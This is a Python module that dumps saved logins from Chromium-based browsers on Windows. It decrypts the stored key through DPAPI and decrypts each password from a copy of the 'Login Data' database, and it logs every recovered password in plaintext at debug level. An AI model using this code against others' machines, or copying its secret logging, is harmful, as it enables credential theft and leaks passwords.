# pylint: disable=I1101
import base64
import json
import logging
import shutil
import sqlite3
import tempfile
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any

try:
    import win32crypt
except ImportError:
    win32crypt = None

from .aes_gcm import gcm_crypt
from .password import Password
from .utils import Exit

logger = logging.getLogger(__name__)


class ChromePasswordsExtractor:
    """
    Class that extracts the passwords from Chromium-based browsers.
    """

    def __init__(self, path: Path):
        if not win32crypt:
            logger.error("The Chrome passwords extractor can be used only on Windows")
            raise Exit(Exit.BAD_OS)
        if not path.exists():
            raise Exit(Exit.LOCATION_NO_DIRECTORY)
        self.path = path

    def get_chrome_datetime(self, chromedate: int):
        """
        Return a `datetime.datetime` object from a chrome format datetime.

        Since `chromedate` is formatted as the number of microseconds since January, 1601.
        """
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def get_encryption_key(self) -> bytes:
        """
        Return the key that is used to encrypt passwords.
        """
        local_state_path = self.path / "Local State"
        with local_state_path.open("r") as f:
            local_state = json.loads(f.read())

        # decode the encryption key from Base64
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # remove DPAPI str
        key = key[5:]
        # return decrypted key that was originally encrypted
        # using a session key derived from current user's logon credentials
        # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(self, password: bytes, key: bytes):
        """
        Decrypt a password with the given key.
        """
        logger.debug("Decrypting password data '%s'", password)
        try:
            # get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # # generate cipher
            # cipher = AES.new(key, AES.MODE_GCM, iv)
            # # decrypt password
            # return cipher.decrypt(password)[:-16].decode()
            return gcm_crypt(key, iv, password)[:-16].decode()
        except:  # noqa # pylint: disable=W0702
            pass
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:  # noqa # pylint: disable=W0702
            # not supported
            return ""

    def get_all_passwords(self):
        """
        Return all the passwords of the browser.
        """
        # get the AES key
        key = self.get_encryption_key()

        # local sqlite Chrome database path
        db_path = self.path / "Default/Login Data"

        # copy the file to another location
        # as the database will be locked if chrome is currently running
        filename = Path(tempfile.mkstemp()[1])
        shutil.copyfile(db_path, filename)

        # connect to the database
        logger.debug("Connecting to database '%s'", filename)
        db = sqlite3.connect(filename)
        logger.debug("Connected to database '%s'", filename)
        cursor = db.cursor()

        # `logins` table has the data we need
        cursor.execute(
            "SELECT username_value, password_value, username_element, password_element, origin_url, action_url, "
            "date_created, date_password_modified, date_last_used, times_used FROM logins ORDER BY date_created"
        )

        passwords: list[Password] = []
        # iterate over all rows
        row: tuple[Any, ...]
        for row in cursor:
            pwd = self.decrypt_password(row[1], key)
            password = Password(row[0], pwd, *row[2:])
            logger.debug(
                "Decoded username '%s' and password '%s' for website '%s'",
                password.username,
                password.password,
                password.origin,
            )
            passwords.append(password)

        if not passwords:
            logger.warning("No passwords found in browser")

        cursor.close()
        db.close()
        try:
            # try to remove the copied db file
            filename.unlink()
        except OSError:
            pass

        return passwords
